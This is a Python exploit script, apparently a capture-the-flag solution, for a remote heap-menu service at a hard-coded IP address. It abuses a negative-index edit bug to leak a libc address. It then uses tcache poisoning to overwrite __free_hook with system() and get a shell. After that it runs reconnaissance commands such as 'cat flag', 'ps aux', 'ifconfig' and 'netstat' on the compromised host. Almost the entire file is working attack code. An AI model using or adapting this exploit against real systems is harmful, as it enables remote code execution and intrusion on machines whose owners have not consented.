#!/usr/bin/env python3

import socket
import sys
import random
import binascii
import time
import struct

BUFSIZE = 2048
DEBUG = False

def readuntil(s,val,slow=False):
	buf = b''
	while not buf.endswith(val):
		if slow:
			ret = s.recv(1)
		else:
			ret = s.recv(BUFSIZE)
		buf = buf + ret
		if DEBUG and len(buf)%16 == 0:
			print(buf)
		#print(buf.decode('ascii'))
		if len(ret) == 0:
			raise Exception('received zero bytes')
	if DEBUG:
		print(buf)
	return buf

def sendall(s,buf):
	if DEBUG:
		print('>>', buf)
	s.send(buf)

def create_chunk(s, size, content=None):
	readuntil(s,b'Choice: ')
	sendall(s,b'1\n')
	readuntil(s,b'Size of the chunk: ')
	sendall(s,b'%d\n'%size)
	readuntil(s,b'Content: ')
	if content is None:
		sendall(s,b'a'*size+b'\n')
	else:
		sendall(s,content+b'\n')

def free_chunk(s, chunkid):
	readuntil(s,b'Choice: ')
	sendall(s,b'2\n')
	readuntil(s,b'ID of chunk: ')
	sendall(s,b'%d\n'%chunkid)

def print_chunk(s, chunkid):
	readuntil(s,b'Choice: ')
	sendall(s,b'3\n')
	readuntil(s,b'ID of chunk: ')
	sendall(s,b'%d\n'%chunkid)
	val = readuntil(s,b'1. Create chunk\n',slow=True)
	return val[:-17]
	
def edit_chunk(s, chunkid, index, char):
	readuntil(s,b'Choice: ')
	sendall(s,b'4\n')
	readuntil(s,b'ID of chunk: ')
	sendall(s,b'%d\n'%chunkid)
	readuntil(s,b'Index of character to edit: ')
	sendall(s,b'%d\n'%index)
	readuntil(s,b'Character: ')
	sendall(s,char+b'\n')

def pwn():

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
	#s.connect(('127.0.0.1',1211))
	s.connect(('3.93.128.89',1215))

	# this chunk will have size 0x21, which fits into 0x30 bytes on the heap
	create_chunk(s,0x11) # 0x21 byte allocation, 0x30 on heap, for arithmetic
	create_chunk(s,0xf0) # 0xf0 byte allocation, 0x100 on heap, for tcache
	create_chunk(s,0x11) # 0x21 byte allocation, 0x30 on heap, for arithmetic and corrupting (libc leak)
	create_chunk(s,0x400) # large allocation, freeing will leak libc address
	create_chunk(s,0x11)
	start_t = time.time()
	N = 0x6873 # "sh"
	print('Creating 0x%x allocations...'%N)
	for i in range(N):
		if i%100 == 0:
			t = time.time()
			if i > 0:
				print('Creating 0x%04x, time remaining %.1f seconds'%(i, (N-i)*((t-start_t)/i)))
		create_chunk(s,1)
	# free chunk to get libc address in its spot
	free_chunk(s,4)

	# make the size of chunk1 and chunk3 large
	edit_chunk(s,1,-2147483648,b'\x7f')
	edit_chunk(s,3,-2147483648,b'\x7f')
	# now both chunks can write "anywhere" past themselves

	# leak libc
	print_chunk(s,3)
	for i in range(0x10,0x28):
		if i%4 == 0:
			print(print_chunk(s,3))
		edit_chunk(s,3,i,b'A')
	val = print_chunk(s,3)
	print(val)

	# calculate libc base address based of address (values specific to this libc.so)
	addr = val[49:55]
	libc_addr, = struct.unpack('Q',addr+b'\x00\x00')
	print('libc_addr', hex(libc_addr))
	libc_base = libc_addr - 0x3ebca0
	print('libc_base', hex(libc_base))

	# compute the address of system() and free_hook
	addr_libc_system = libc_base + 0x000000000004f440
	addr_free_hook = libc_base + 0x00000000003ed8e8
	print('__libc_system =', hex(addr_libc_system))
	print('__free_hook = ', hex(addr_free_hook))

	# https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c
	# free chunk 2 so we build a tcache for this value
	free_chunk(s,2)

	# write the free_hook address (-0x10) in the free'd chunk so that it lands on the tcache linked list
	to_write = struct.pack('Q',addr_free_hook-0x10)
	for i,b in enumerate(to_write):
		if b != 0:
			edit_chunk(s,1,0x30-0x10+i,bytes([b]))

	# allocate twice so that the second allocation gets our free_hook tcache entry, and write the system() address after allocation
	create_chunk(s,0xf0,struct.pack('Q',addr_libc_system))
	create_chunk(s,0xf0,struct.pack('Q',addr_libc_system))

	# free() should now call system() instead so we just need to free a pointer with a valid string
	global DEBUG
	DEBUG = True

	free_chunk(s,0x6469) # "id"
	free_chunk(s,0x6873) # "sh"
	time.sleep(1)
	#print(s.recv(BUFSIZE))
	sendall(s,b'id\n')
	print(s.recv(BUFSIZE).decode('ascii'))
	sendall(s,b'ls -al\n')
	print(s.recv(BUFSIZE).decode('ascii'))
	sendall(s,b'cat flag\n')
	print(s.recv(BUFSIZE).decode('ascii'))
	sendall(s,b'ps aux\n')
	print(s.recv(BUFSIZE).decode('ascii'))
	sendall(s,b'ifconfig\n')
	print(s.recv(BUFSIZE).decode('ascii'))
	sendall(s,b'netstat -anoptu\n')
	print(s.recv(BUFSIZE).decode('ascii'))

	while True:
		print(s.recv(BUFSIZE).decode('ascii'))

if __name__ == '__main__':

	pwn()

